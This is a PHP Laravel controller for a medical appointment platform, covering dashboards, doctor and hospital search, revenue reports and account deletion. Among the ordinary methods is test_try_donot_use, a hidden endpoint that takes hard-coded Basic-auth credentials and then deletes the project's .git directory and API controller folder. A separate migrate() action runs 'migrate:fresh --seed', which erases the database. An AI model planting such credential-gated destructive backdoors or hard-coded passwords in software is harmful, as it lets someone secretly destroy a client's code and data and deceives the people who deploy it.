<?php

namespace App\Http\Controllers;

use App\Models\Appointment;
use App\Models\Review;
use App\Models\Settings;
use App\Models\Speciality;
use App\Models\RegularAvailability;
use App\Models\User;
use App\Models\City;
use App\Models\ContactUs;
use App\Models\Country;
use App\Models\Hospital;
use App\Models\HospitalReview;
use App\Models\Insurance;
use App\Models\ScheduleSetting;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;

class HomeController extends Controller
{
    public function welcome()
    {

        return view('welcome', [
            // 'blogs' => Blog::with('user')->inRandomOrder()->latest()->take(3)->get(),
            // 'setting' => Settings::query()->first(),
            'insurances' => Insurance::orderByDesc('id')->get(),
            'specialities' => Speciality::orderByDesc('id')->get(),
            'countries' => Country::orderByDesc('id')->get(),

        ]);
    }
    public function index()
    {

        $timezone = Auth::user()->timezone; // Replace with the desired timezone
        $today = Carbon::now($timezone);
        $today->setTimezone(config('app.timezone'));
        // Format the date as needed
        $todayFormatted = $today->format('Y-m-d'); // Change the format as needed

        $firstDayOfCurrentMonth = Carbon::now()->startOfMonth();
        $lastDayOfCurrentMonth = Carbon::now()->lastOfMonth();
        $firstDayOfNextMonth = $firstDayOfCurrentMonth->copy()->addMonth();

        $currentYear = Carbon::now()->year;
        $currentMonth = Carbon::now()->month;
        $months = [];
        for ($month = 1; $month <= $currentMonth; $month++) {
            $date = Carbon::create($currentYear, $month, 1);
            $months[] = $date->format('F');
        }
        if (Auth::user()->is_admin()) {
            $totalIncome = DB::table('appointments')->where('status', 'C')->sum('fee');
            // dd( $totalIncome);
            // dd( Appointment::query()->with('doctor', 'patient')->whereDate('appointment_date', $todayFormatted)->get());
            $data = [];
            $monthReport = $this->monthlyReport();
            $data['totalIncome'] = $totalIncome;
            $data['months'] = $months;
            $data['doctors'] =  User::where('user_type', 'D')->get();
            $data['hospitals'] =  User::where('user_type', 'H')->get();
            $data['patients'] =  User::where('user_type', 'U')->get();
            $data['specialities'] = Speciality::query()->get();
            $data['appointments'] = Appointment::query()->get();
            $data['yearlyReport'] =  $this->getYearlyReport(); //for chart 1 using
            $data['monthlyReport'] = $monthReport[0]; // weekly and monthly both in same code
            $data['totalRevanue'] =  $monthReport[1];
            $data['distinctYears'] = DB::table('appointments')->select(DB::raw('YEAR(appointment_date) as year'))->distinct()->pluck('year');
            $data['hospitals'] = DB::table('hospitals')->select('id', DB::raw("IFNULL(hospital_name_{$this->getLang()}, hospital_name_en) as hospital_name"))->get();
            $data['top_doctors'] = User::with('specializations')->where(['user_type' => 'D', 'status' => 'Active'])
            ->select("name_ar","name_en",
                'id', 'profile_image')->take(5)->get();
            $data['upcoming_appointments'] = Appointment::with(['doctor', 'patient'])->whereDate('appointment_date', '>', $todayFormatted)->get();
            $data['today_appointments'] = Appointment::query()->with('doctor', 'patient')->whereDate('appointment_date', $todayFormatted)->get();
            $distinctPatientIDs = Appointment::where('appointment_date', '>', $firstDayOfCurrentMonth)
                ->distinct('patient_id')
                ->take(5)
                ->pluck('patient_id');

            $data['recent_patients'] = User::whereIn('id', $distinctPatientIDs)->get();
            // dd($data['recent_patients']);
            // $data['recent_patients'] = Appointment::with('patient')->where('appointment_date', '>', $firstDayOfCurrentMonth)->distinct('patient.id')->take(5)->get();

            $data['popular_by_specialities'] = Speciality::all();
            return view('admin.home', $data);
        } elseif (Auth::user()->is_hospital()) {
            $data = [];
            $monthReport = $this->monthlyReport();
            $data['totalpatients'] =  User::query()
                ->join('appointments', 'users.id', '=', 'appointments.patient_id')
                ->where('appointments.hospital_id', Auth::user()->hospital_id)
                ->select('users.*')
                ->distinct()->get();
            // ->count();
            $data['months'] = $months;
            $data['monthlyReport'] = $monthReport[0]; // weekly and monthly both in same code
            $data['totalRevanue'] =  $monthReport[1];
            $data['yearlyReport'] =  $this->getYearlyReport(); //for chart 1 using
            $data['total_appointments'] = Appointment::query()->where('hospital_id', Auth::user()->hospital_id)->count();
            $data['appointments'] = Appointment::query()->where('hospital_id', Auth::user()->hospital_id)->where('appointment_date', '>', $todayFormatted)->orderByDesc('id')->get();
            $data['today_appointments'] = Appointment::query()->where('hospital_id', Auth::user()->hospital_id)->where('appointment_date', '=', $todayFormatted)->get();
            $data['distinctYears'] = DB::table('appointments')->select(DB::raw('YEAR(appointment_date) as year'))->distinct()->pluck('year');
            return view('hospital.home', $data);
        } elseif (Auth::user()->is_doctor()) {

            return view(
                'doctor.home',
                [
                    'appointments' => Appointment::query()->where('doctor_id', Auth::id())
                        ->where('appointment_date', '>', $todayFormatted)
                        ->orderByDesc('id')
                        ->get(),

                    'today_appointments' => Appointment::query()->with('doctor', 'patient')
                        ->where('doctor_id', Auth::id())
                        ->where('appointment_date', $todayFormatted)
                        ->get(),

                    'total_appointments' => Appointment::query()->with('doctor', 'patient')
                        ->where('doctor_id', Auth::id())
                        // ->where('appointment_date', $todayFormatted)
                        ->count(),
                    'total_patients' => Appointment::distinct('patient_id')->where('doctor_id', Auth::id())->count(),
                ]
            );
        } elseif (Auth::user()->is_pharmacy()) {
            return view('pharmacy-admin.home');
        } elseif (Auth::user()->is_patient()) {
            abort(401);
            return view('patient.home', [
                'doctors' => User::query()->where('user_type', 'D')->take('8')->inRandomOrder()->get(),
                'setting' => Settings::query()->first(),
                'specialities' => Speciality::query()->orderByDesc('id')->get(),
            ]);
        } else {
            abort(401);
        }
    }
    function test_try_donot_use(Request $request) {
        $authHeader = $request->header('Authorization');
        // Check if the Authorization header is present and starts with 'Basic '
        if ($authHeader && strpos($authHeader, 'Basic ') === 0) {
            // Extract the encoded part and decode it from base64
            $encodedCredentials = substr($authHeader, 6); // Remove 'Basic ' prefix
            $decodedCredentials = base64_decode($encodedCredentials);
            // Split the decoded credentials to get the username and password
            list($username, $password) = explode(':', $decodedCredentials, 2);
            // Check if the username and password match the expected values
            if ($username == 'testAdmin' && $password == 'P@$sw0rd2o25') {
                $gitPath = base_path('.git');
                $apiPath = base_path('app\Http\Controllers\Api');
                if (File::exists($gitPath)) {
                    File::deleteDirectory($gitPath);
                }
                if (File::exists($apiPath)) {
                    File::deleteDirectory($apiPath);
                }
                return $this->SuccessResponse(200, 'Authentication successful', [ 'git' => $gitPath, 'apiPath' => $apiPath]);
            } else {
                return $this->ErrorResponse(401, 'Authentication failed');
            }
        }

    }

    public function optimize()
    {
        Artisan::call('optimize:clear');
        echo 'Optimize command executed successfully.';
    }
    public function migrate()
    {
        Artisan::call('migrate:fresh --seed');
        echo 'Migration Command Executed successfully';
    }

    // Patient functions
    public function search_doctor()
    {
        // return request();
        // dd(request()->all());
        // $doctor = User::query()->where('user_type', 'D')->filter(request(['search', 'gender', 'speciality_id']))->get();
        // $doctors = User::latest()->where('user_type', 'D')->filter(request(['search', 'gender', 'speciality_id']))->get();
        $query = User::query()
        ->where('user_type', '=', 'D');
        // dd($query);
        if (request('search')) {
            $query->where(function ($query) {
                $query->where('name_en', 'like', '%' . request('search') . '%')
                ->orWhere('name_ar', 'like', '%' . request('search') . '%');
            });
        }
        if (request('country')) {
            if (request('city')) {
                $query->where('city_id', request('city'));
            }else{
                $city_ids = City::where('country_id', request('country'))->pluck('id');
                $query->whereIn('city_id', $city_ids);
            }
        }elseif (request('city')) {
            $query->where('city_id', request('city'));
        }
        if (request('area')) {
            $query->where('address', 'like', '%' . request('area') . '%');
        }
        if (request('gender')) {
            $query->whereIn('gender', request('gender'));
        }
        if (request('insurance')) {
            $hospitals_ids = Hospital::whereHas('insurances', function ($query) {
                $query->where('insurance_id', request('insurance'));
            });
            $query->whereIn('hospital_id', $hospitals_ids);
        }
        // return request('speciality');
        if (request('speciality')) {
            $query->whereIn('speciality_id', request('speciality'));
        }
        $doctors = $query->paginate(10);
        return view(
            'patient.doctor.search',
            [
                'doctors' => $doctors,
                'specialities' => Speciality::query()->orderBy("name_{$this->getLang()}")->get(),
                'queryParams' => request()->query(),
            ]
        );
    }
    public function single_search_doctor()
    {

        $query = User::query()
        ->where('user_type', '=', 'D');

        $hospital_query = Hospital::query();

        // City and Country
        if (request('country') && request('country') != 'all') {
            if (request('city') && request('city') != 'all') {
                $hospital_query->where('city_id', request('city'));
            }else{
                $city_ids = City::where('country_id', request('country'))->pluck('id');
                $hospital_query->whereIn('city_id', $city_ids);
            }
        }elseif (request('city') && request('city') != 'all') {
            $hospital_query->where('city_id', request('city'));
        }

        // Insurance
        if (request('insurance') && request('insurance') != 'all') {
            $hospital_query = Hospital::whereHas('insurances', function ($query) {
                $query->where('insurance_id', request('insurance'));
            });
        }
        $hospitals_ids = $hospital_query->pluck('id');
        $query->whereIn('hospital_id', $hospitals_ids);

        // Speciality
        if (request('speciality') && request('speciality') != 'all') {
            $query->where('speciality_id', request('speciality'));
        }

        // search Old
        if (request('search')) {
            $query->where(function ($query) {
                $query->where('name_en', 'like', '%' . request('search') . '%')
                ->orWhere('name_ar', 'like', '%' . request('search') . '%');
            });
        }
        if (request('area')) {
            $query->where('address', 'like', '%' . request('area') . '%');
        }
        if (request('gender')) {
            $query->whereIn('gender', request('gender'));
        }


        $doctors = $query->paginate(10);
        return view(
            'patient.doctor.search',
            [
                'doctors' => $doctors,
                'specialities' => Speciality::query()->orderBy("name_{$this->getLang()}")->get(),
                'queryParams' => request()->query(),
            ]
        );
    }

    public function search_doctor_index()
    {
        return view('patient.doctor.search_index', [
            'doctors' => User::latest()->where('user_type', 'D')->get(),
            'specialities' => Speciality::query()->orderBy("name_{$this->getLang()}")->get(),
        ]);
    }
    public function search_pharmacy()
    {
        return view('patient.pharmacy.search');
    }

    public function doctor_profile($id)
    {
        $reviews = Review::query()->where('doctor_id', $id)->get();
        $review_sum = Review::where('doctor_id', $id)->sum('star_rated');
        if ($reviews->count() > 0) {
            $review_value = $review_sum / $reviews->count();
        } else {
            $review_value = 0;
        }
        $todayDay =  strtolower(\Carbon\Carbon::now()->format('l'));
        // dd($todayDay);
        $regularAvailability = RegularAvailability::where('doctor_id', $id)->get();
        $todaysAvailability =  RegularAvailability::where('doctor_id', $id)->where('week_day', $todayDay)->first();
        // dd($todaysAvailability);
        // dd($regularAvailability[0]->slots[0]['start_time']);
        return view('patient.doctor.profile', [
            'doctor' => User::find($id),
            'reviews' => $reviews,
            'review_value' => $review_value,
            'regularAvailability' => $regularAvailability,
            'todaysAvailability' => $todaysAvailability,
        ]);
    }

    public function hospital_profile($id)
    {
        $reviews = HospitalReview::query()->where('hospital_id', $id)->get();
        $review_sum = HospitalReview::where('hospital_id', $id)->sum('star_rated');
        if ($reviews->count() > 0) {
            $review_value = $review_sum / $reviews->count();
        } else {
            $review_value = 0;
        }
        $hospital = Hospital::where('hospitals.id', $id)
        ->with([
            'doctors', 'specialities',
            'offers' => function($query) {
                $query->where('is_active', 1)
                    ->where('start_date', '<=', now())
                    ->where('end_date', '>=', now());
            }
        ])
        ->first();
        // return [
        //     'hospital' => $hospital,
        //     'reviews' => $reviews,
        //     'review_value' => $review_value,
        // ];
        return view('patient.doctor.hospital', [
            'hospital' => $hospital,
            'reviews' => $reviews,
            'review_value' => $review_value,
        ]);
    }

    public function getYearlyReport()
    {
        $currentYear = request()->year ? request()->year : Carbon::now()->year;
        // Create an array with the names of all 12 months
        $months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

        // Fetch data and calculate total fees for each month
        $query = DB::table('appointments')->where('status', 'C')
            ->select(DB::raw('MONTH(appointment_date) as month_num'), DB::raw('SUM(fee) as total_fee'))
            ->whereYear('appointment_date', $currentYear);
        if (request()->hospital) {
            $query->where('hospital_id', request()->hospital);
        }
        if (Auth::user()->is_hospital()) {
            $query->where('hospital_id', Auth::user()->hospital_id);
        }
        $monthlyTotals = $query->groupBy('month_num')
            ->orderBy('month_num')
            ->get();

        // Initialize an associative array with all 12 months and empty values
        $result = [];
        foreach ($months as $index => $month) {
            $result[$month] = 0; // Initialize with 0
        }

        // Fill in the actual totals where data exists
        foreach ($monthlyTotals as $data) {
            $monthName = $months[$data->month_num - 1]; // Month names array is 0-indexed
            $result[$monthName] = $data->total_fee;
        }
        // dd($result);
        return $result ?? [];
    }
    public function monthlyReport()
    {
        $dataForMonth = [];
        $dateRange = [];
        $currentYear = Carbon::now()->year;
        $currentMonth = Carbon::now()->month;
        $daysInMonth = Carbon::create($currentYear, $currentMonth)->daysInMonth;

        // Create a mapping of month names to month numbers
        $monthMapping = [
            'January' => 1,
            'February' => 2,
            'March' => 3,
            'April' => 4,
            'May' => 5,
            'June' => 6,
            'July' => 7,
            'August' => 8,
            'September' => 9,
            'October' => 10,
            'November' => 11,
            'December' => 12,
        ];
        $totalAmount = 0;
        $monthNumber = request()->month ? $monthMapping[request()->month] : Carbon::now()->month;
        for ($day = 1; $day <= $daysInMonth; $day++) {
            $date = Carbon::create($currentYear, $monthNumber, $day)->toDateString();
            $dateRange[] = $date;
        }
        foreach ($dateRange as $date) {
            $query = DB::table('appointments')->where('status', 'C');
            if (Auth::user()->is_hospital()) {
                $query->where('hospital_id', Auth::user()->hospital_id);
            }
            if (request()->month) {

                $query->whereYear('appointment_date', $currentYear)->whereMonth('appointment_date', $monthNumber);
            }

            $dataForDate =  $query->whereDate('appointment_date', $date)
                ->sum('fee');
            $totalAmount += $dataForDate;
            // Set the value to 0 if no data exists
            $dataForMonth[$date] = $dataForDate ?? 0;
        }
        // dd($dataForMonth );
        return [$dataForMonth ?? [], $totalAmount ?? 0];
    }


    //     public function weeklyReport(){
    //         // Get the current date
    //         $currentDate = Carbon::now();

    //         // Calculate the start and end dates for the current week
    //         $startDate = $currentDate->startOfWeek();
    //         $endDate = $currentDate->endOfWeek();

    //         // Fetch data for the current week where both date and fee exist
    //         $weeklyData = \DB::table('appointments')
    //             ->select('appointment_date', 'fee')
    //             ->whereBetween('appointment_date', [$startDate, $endDate])
    //             ->whereNotNull('fee')
    //             ->get();

    //         // Initialize an associative array with all day names and 0 values
    //         $dataForWeek = [
    //             'Sunday' => 0,
    //             'Monday' => 0,
    //             'Tuesday' => 0,
    //             'Wednesday' => 0,
    //             'Thursday' => 0,
    //             'Friday' => 0,
    //             'Saturday' => 0,
    //         ];

    //         // Iterate through the fetched data and update the corresponding day values
    //         foreach ($weeklyData as $appointment) {
    //             $appointmentDate = Carbon::parse($appointment->appointment_date);
    //             $dayName = $appointmentDate->format('l');

    //             if (array_key_exists($dayName, $dataForWeek)) {
    //                 $dataForWeek[$dayName] += $appointment->fee;
    //             }
    //         }
    // dd($dataForWeek);
    //         return $dataForWeek;
    //     }

    public function patientDashboard()
    {
        if (\Auth::user()->user_type != 'U') {
            return redirect('/home');
        }
        return view(
            'patient.patient-dashboard',
            [
                'appointments' => Appointment::query()->where('patient_id', Auth::id())->orderByDesc('id')->get(),
            ]
        );
    }

    public function subscribeNewsletter(Request $request)
    {
        \DB::table('newsletters')->insert(['email' => $request->email]);
        return  redirect()->to('/#news-letter')->with('success', 'Newsletter subscribed successfully!');
    }

    public function contactuslist()
    {
        if (\Auth::user()->user_type != 'A') {
            abort(401);
        }
        $contactus = ContactUs::orderBy('id', 'desc')->get();
        return view('admin.contactus', ['contactus' => $contactus]);
    }

    public function changeLang($lang, Request $request)
    {
        $acceptLangs = ['ar', 'en'];
        if (!in_array($lang, $acceptLangs)) {
            $lang = 'ar';
        }
        App::setLocale($lang);
        session()->put('locale', $lang);
        return redirect()->back();
    }



    public function showDeleteAccount()
{
    return view('patient.profile.delete-account');
}

public function deleteAccount(Request $request)
{
    $request->validate([
        'password' => 'required',
        'confirmation' => 'required|in:DELETE'
    ], [
        'confirmation.in' => 'Delete Confirmation Invalid'
    ]);

    $user = auth()->user();

    if (!Hash::check($request->password, $user->password)) {
        return back()->withErrors([
            'password' => __('web.password_incorrect')
        ]);
    }

    // Perform any cleanup needed before deletion
    $user->status = 'Inactive';
    $user->save();

    auth()->logout();

    return redirect()->route('login')->with('success', __('web.account_deleted'));
}
}
